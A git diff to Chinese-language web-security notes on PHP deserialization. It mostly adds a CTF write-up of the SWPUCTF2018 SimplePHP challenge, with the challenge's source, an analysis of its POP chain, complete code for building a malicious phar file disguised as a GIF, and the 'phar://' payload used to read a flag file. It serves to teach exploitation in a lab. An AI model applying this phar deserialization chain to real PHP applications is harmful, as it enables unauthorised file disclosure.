@@ -420,7 +420,7 @@ mysql information_schema库被禁
         __callStatic() //在静态上下文中调用不可访问的方法时触发
         __construct()  //实例化对象时被调用， 当__construct和以类名为函数名的函数同时存在时，__construct将被调用，另一个不被调用。  
         __get() //读取一个对象的属性时，若属性存在，则直接返回属性值； 若不存在，则会调用__get函数。 
-        __set() //设置一个对象的属性时， 若属性存在，则直接赋值；若不存在，则会调用_set函数。
+        __set() //设置一个对象的属性时， 若属性存在，则直接赋值；若不存在，则会调用__set函数。
         __isset() //在不可访问的属性上调用isset()或empty()触发
         __unset() //在不可访问的属性上使用unset()时触发
         __autoload() //实例化一个对象时，如果对应的类不存在，则该方法被调用。
@@ -1249,7 +1249,9 @@ so:
     1. phar文件要能够上传到服务器端。
     2. 要有可用的魔术方法作为“跳板”。
     3. 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。
-5. 绕过方式
+5. 受影响的函数
+    ![alt text](./phar-func.png)
+6. 绕过方式
 
     当环境限制了phar不能出现在前面的字符里。可以使用`compress.bzip2://`和`compress.zlib://`等绕过
     ```php
@@ -1277,7 +1279,7 @@ so:
    2. phar漏洞利用条件里面有一条需要有魔术方法作为跳板，`class.php`里面有个`__call()`函数，正好可以利用
    3. 如果想要读取文件内容，肯定要利用class.php中的File.close()，但是没有直接调用这个方法的语句；
    4. 注意到 User类中在 __destruct时调用了close()，按原逻辑，$db应该是mysqli即数据库对象，但是我们可以构造$db指定为 File对象，这样就可以读取到文件了。可读取到文件不能呈现给我们
-   5. 注意到 __call魔术方法，这个魔术方法的主要功能就是，如果要调用的方法我们这个类中不存在，就会去File中找这个方法，并把执行结果存入 $this->results[$file->name()][$func]
+   5. 注意到 `__call`魔术方法，这个魔术方法的主要功能就是，如果要调用的方法我们这个类中不存在，就会去File中找这个方法，并把执行结果存入 `$this->results[$file->name()][$func]`
    6. 刚好我们利用这一点：让 $db为 FileList对象，当 $db销毁时，触发 __destruct，调用close()，由于 FileList没有这个方法，于是去 File类中找方法，读取到文件，存入 results
 
     `$user -> __destruct() => $db -> close() => $db->__call(close) => $file -> close() =>$results=file_get_contents($filename) => FileList->__destruct()输出$result`
@@ -1316,6 +1318,166 @@ so:
     $phar->addFromString("shell.txt","snowy"); //添加压缩文件，文件名字为shell.txt,内容为snowy
     $phar->stopBuffering();
     ```
+
+#### SWPUCTF2018 SimplePHP(文件泄露+phar反序列化)
+
+1. 进去后发现文件上传，以为时文件上传漏洞，测试过后才发现只能上传图片类型，有后缀名校验，所以木马行不通，查看第二个文件展示页面，但是没有东西，url中有一个file参数，，用之前传的文件的文件名测试也不行，返回的都是文件不存在，所以这里猜测，文件名应该被改成md5加密ip地址或者文件名什么的了。
+2. 用dirsearch扫描目录看到一个`/upload/`，访问了一下，发现里面存放的正好是之前上传的文件，结合文件展示页面，把文件名赋值给file参数，还是不行；改成`/upload/xxx.jpg`，还不行，想到用相对路径，成功。
+3. 读取源码。(关键源码如下)
+
+    file.php
+    ```php
+    <?php 
+    header("content-type:text/html;charset=utf-8");  
+    include 'function.php'; 
+    include 'class.php'; 
+    ini_set('open_basedir','/var/www/html/'); 
+    $file = $_GET["file"] ? $_GET['file'] : ""; 
+    if(empty($file)) { 
+        echo "<h2>There is no file to show!<h2/>"; 
+    } 
+    $show = new Show(); 
+    if(file_exists($file)) { 
+        $show->source = $file; 
+        $show->_show(); 
+    } else if (!empty($file)){ 
+        die('file doesn\'t exists.'); 
+    } 
+    ?> 
+    ```
+
+    class.php
+    ```php
+    <?php
+    class C1e4r
+    {
+        public $test;
+        public $str;
+        public function __construct($name)
+        {
+            $this->str = $name;
+        }
+        public function __destruct()
+        {
+            $this->test = $this->str;
+            echo $this->test;
+        }
+    }
+    class Show
+    {
+        public $source;
+        public $str;
+        public function __construct($file)
+        {
+            $this->source = $file;   //$this->source = phar://phar.jpg
+            echo $this->source;
+        }
+        public function __toString()
+        {
+            $content = $this->str['str']->source;
+            return $content;
+        }
+        public function __set($key,$value)
+        {
+            $this->$key = $value;
+        }
+        public function _show()
+        {
+            if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
+                die('hacker!');
+            } else {
+                highlight_file($this->source);
+            }
+            
+        }
+        public function __wakeup()
+        {
+            if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
+                echo "hacker~";
+                $this->source = "index.php";
+            }
+        }
+    }
+    class Test
+    {
+        public $file;
+        public $params;
+        public function __construct()
+        {
+            $this->params = array();
+        }
+        public function __get($key)
+        {
+            return $this->get($key);
+        }
+        public function get($key)
+        {
+            if(isset($this->params[$key])) {
+                $value = $this->params[$key];
+            } else {
+                $value = "index.php";
+            }
+            return $this->file_get($value);
+        }
+        public function file_get($value)
+        {
+            $text = base64_encode(file_get_contents($value));
+            return $text;
+        }
+    }
+    ?> 
+    ```
+    看到`class.php`发现其中不少魔术函数，而且有两个类没用用到，源码中看到一句注释`//$this->source = phar://phar.jpg`,所以猜测可能是phar反序列化。其实还有一个原因时file.php中验证文件是否存在时用了一个file_exists()函数，这个函数会触发phar反序列化。
+4. 分析源码，Test类中有个读文件内容的函数(Show类中也能读取文件,但是它过滤了f1ag.php)
+
+    1. 分析class.php，Test()类中`__get($key)`函数调用`get($value)`函数,`get($value)`函数调用`file_get($value)`函数从而读取文件内容。而`__get($key)`被调用的条件是访问对象中不存在的属性;
+
+    大致流程就是：`不存在的函数或属性->__get魔法函数->get函数->file_get函数读取`
+
+    2. 这时，我们就要找到一个不存在的调用,Show()类中的`__toString()`函数有`$this->str['str']->source`,所以我们可以`$this->str['str'] = new Test()`,而Test()类中没有source属性或方法，正好可以触发`__get()`函数;
+
+    到目前为止：`Show()::__toString()->__get魔法函数->get函数->file_get函数读取`
+
+    3. 那么下一个问题就是想办法触发`__toString()`,这个魔法函数触发的条件是，把类当作字符串处理。Show类中没有,接着往上看,C1e4r类中`__destruct()`正好有`echo $this->test;`,那么我们就可以`$this-test = new Show()`,从而来触发`toString()`函数。而`__destruct`是自动触发的。整个pop链分析完成。
+5. pop链构造代码
+
+    ```php
+    <?php
+    class C1e4r
+    {
+        public $test;
+        public $str;
+    }
+    class Show
+    {
+        public $source;
+        public $str;
+    }
+    class Test
+    {
+        public $file;
+        public $params;
+    }
+
+    $c = new Test();
+    $c->params = array('source'=>'/var/www/html/f1ag.php');
+    $b = new Show();
+    $b->str['str'] = $c;
+    $a = new C1e4r();
+    $a->str = $b;
+
+    $phar = new Phar('shell.phar');
+    $phar->startBuffering();
+    $phar->setStub("GIF89a<?php __HALT_COMPILER();?>");
+    $phar->setMetadata($a);
+    $phar->addFromString('shell.txt','aaa');
+    $phar->stopBuffering();
+    ?>
+    ```
+    运行完后，在当前目录会生成一个`shell.phar`文件，改一下后缀名，上传，直接去访问/upload/，找到文件名记下来
+
+    payload: `file=phar://upload/xxxx.jpg`,得到的内容base64解码
+
 
 ## python反序列化
 
